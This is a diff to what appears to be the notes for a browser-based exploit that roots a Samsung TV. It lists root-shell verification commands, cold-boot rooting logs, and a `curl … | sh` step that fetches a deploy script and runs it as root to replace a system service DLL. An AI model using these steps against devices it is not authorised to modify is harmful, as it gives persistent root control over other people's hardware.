@@ -362,8 +362,8 @@ shell - that corrupts the stream and wastes the page load.
 duplicate an inventory here.
 
 `server/payload.dll` is the artifact the TV fetches during deploy and is
-byte-identical to `payload/out/MultiControlService.dll` (md5 `1ab4343e…`, v41;
-reproducible — see §9), so a clone runs without a .NET SDK. Rebuild with
+byte-identical to `payload/out/MultiControlService.dll` (md5 in the §1 state
+row; builds are reproducible — see §9), so a clone runs without a .NET SDK. Rebuild with
 `dotnet build payload/BootPayload.csproj -c Release -o out`, then copy it over
 `server/payload.dll`; there is **no `WANT=` constant to update** any more — the
 server renders the hash/size into `deploy.sh` per request from the file it serves.
@@ -412,7 +412,7 @@ python run_root.py "id" 6               # uid=0(root)
 #    from the address the TV used and WANT=/SIZE_WANT= from the payload.dll it
 #    serves, so there is no generated copy to go stale (the old deploy_local.sh).
 python run_root.py "curl -s http://<HOST_IP>/deploy.sh | sh" 45
-#    expect: UID=0, SIZE=33792, MD5=1ab4343e..., COPY=ok, HOST_FILE=..., DEPLOY_DONE
+#    expect: UID=0, SIZE/MD5 per the §1 state row, COPY=ok, HOST_FILE=..., TOKEN_FILE=..., DEPLOY_DONE
 
 # 5. reboot the TV (exit the browser first so it does not restore the page)
 
@@ -430,7 +430,7 @@ gateway, deploy/uninstall control flow, source↔blob↔page consistency). Then:
 
 - [x] `root_shell.py "id" <TV_IP>` returns `uid=0(root)` - **verified 2026-10-26**.
 - [x] `root_shell.py "cat /proc/self/status | grep CapEff" <TV_IP>` → `0000003fffffffff` - **verified 2026-10-26**.
-- [x] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` → `1ab4343e…` (verified 2026-10-27; `payload_backup.dll` is now also v41)
+- [x] `root_shell.py "md5sum /opt/usr/apps/com.samsung.tv.MultiControl-Service/bin/MultiControlService.dll" <TV_IP>` matches `server/payload.dll` - the §1 state row is the single source (verified 2026-10-27; `payload_backup.dll` was v41 then too)
 - [x] Cold boot with the browser closed → attempt 1 high exits in ~2 s (v39.2, 2026-10-26: **39 s**, attempt 1 `fast-exit` t=29, attempt 2 `self-patch` t=39, `ROOTCHAN` t=40) (`high-alloc … fast-exit`), attempt 2 roots; **v41 cold boots 2026-10-27: 36 s** (attempt 1 t=29, attempt 2 `direct-parent` t=36) **and 49 s** (AUL late, one direct-patch attempt); v37 cold boot observed **37 s** (attempt 2; attempt 1 `seen=0`); v35: 37 s; v34: 34 s and 68 s. Attempt-1 `SUCCESS` is a bonus; attempt 2 is the floor, but a slow hunt can push to attempt 3.
 - [x] `kill -9 <app pid>` → channel back - **~2 s on v41 (2026-10-27)**, new pid rooted via `self-patch`, uid 0.
 - [x] `python tools/test_all.py --tv` against a fresh page load (stub protocol
@@ -691,9 +691,9 @@ that downloads it) and reboot. Things to preserve when editing `Program.cs`:
 - ~~Clamp the stub's client-controlled lengths~~ — **done**: `physrpc.S` bounds
   READ/WRITE32/READMANY/RUN/FILE, refuses with -EINVAL, and ends the stub for the
   two ops whose payload would desync the stream; v39 added NUL termination and
-  moved the RUN/FILE caps to 511/255, so the blob is now 7,720 B (v40 added the
+  moved the RUN/FILE caps to 511/255 (current blob size in the §1 state row; v40 added the
   pairing token word and the early 8-byte `PGDB`+token send; rebuilt and
-  re-embedded; both `--check` modes green, live-verified earlier by
+  re-embedded); both `--check` modes green, live-verified earlier by
   `tools/test_stub.py` — re-run `--tv` after one fresh page load).
 - ~~Retry `open("/dev/video40")` instead of sleeping 120 s~~ — **done in v7**
   (120 s retry), so a browser stub holding the device no longer costs a cycle.
